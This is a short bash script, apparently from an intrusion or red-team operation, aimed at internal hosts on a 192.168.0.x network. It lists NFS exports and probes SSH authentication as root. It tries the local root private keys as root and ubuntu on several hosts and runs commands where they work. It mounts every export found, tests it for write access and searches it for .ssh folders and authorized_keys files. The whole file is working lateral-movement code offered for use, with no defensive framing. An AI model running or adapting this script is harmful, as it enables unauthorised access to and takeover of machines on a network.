#!/bin/bash
# g0023 -> workers: NFS exports + ssh auth methods (bash)
echo "=== ID"; hostname; id -u
echo "=== SHOWMOUNT"
for h in 192.168.0.24 192.168.0.28 192.168.0.30 192.168.0.31 192.168.0.20 192.168.0.21 192.168.0.22; do
  echo "--- $h"; timeout 12 showmount -e "$h" 2>&1 | head -8
done
echo "=== AUTHMETHODS"
for h in 192.168.0.24 192.168.0.28 192.168.0.30 192.168.0.31; do
  echo "--- $h"; timeout 12 ssh -o PreferredAuthentications=none -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 root@"$h" 2>&1 | grep -E 'Authentications that can continue|Permission denied|refused|timed out|banner|remote software' | head -4
done
echo "=== SSHKEYS"
for h in 192.168.0.24 192.168.0.28 192.168.0.30 192.168.0.31; do
  for k in /root/.ssh/id_rsa /root/.ssh/id_ed25519; do
    [ -f "$k" ] || continue
    for u in root ubuntu; do
      out=$(timeout 12 ssh -i "$k" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 -o IdentitiesOnly=yes "$u@$h" 'id; hostname' 2>&1 | head -3 | tr '\n' '|')
      echo "TRY $u@$h $(basename "$k") => ${out:0:150}"
    done
  done
done
echo "=== MOUNT"
mkdir -p /mnt/ulx
for h in 192.168.0.24 192.168.0.28 192.168.0.30 192.168.0.31 192.168.0.20; do
  ex=$(timeout 12 showmount -e "$h" 2>/dev/null | awk 'NR>1 && $1 ~ /^\//{print $1}')
  for e in $ex; do
    m="/mnt/ulx/$(echo "$h" | tr . _)$(echo "$e" | tr / _)"
    mkdir -p "$m"
    echo "--- mount $h:$e -> $m"
    timeout 25 mount -t nfs -o vers=3,nolock,soft,timeo=10,retrans=1 "$h:$e" "$m" 2>&1 | head -2
    timeout 15 ls -la "$m" 2>&1 | head -8
    if timeout 10 touch "$m/.ulw" 2>/dev/null; then echo "WRITABLE $h:$e"; rm -f "$m/.ulw"; else echo "RO $h:$e"; fi
    timeout 20 find "$m" -maxdepth 3 \( -name '.ssh' -o -name 'authorized_keys' \) 2>/dev/null | head -5
  done
done
echo "=== DONE"
